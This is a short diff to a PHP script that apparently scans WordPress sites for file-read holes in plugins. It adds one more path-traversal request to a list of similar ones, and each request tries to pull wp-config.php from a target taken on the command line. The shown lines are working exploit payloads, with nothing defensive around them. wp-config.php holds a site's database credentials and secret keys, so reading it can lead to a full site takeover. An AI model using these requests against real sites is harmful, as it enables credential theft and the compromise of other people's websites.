@@ -265,6 +265,7 @@ __request($argv[1], '/wp-content/plugins/history-collection/download.php?var=../
 
 __request($argv[1], '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php');
 
+__request($argv[1], '/?action=cpis_init&cpis-action=f-download&purchase_id=1&cpis_user_email=i0SECLAB@intermal.com&f=../../../../wp-config.php');
 
 function __request($url, $plugin) {
 
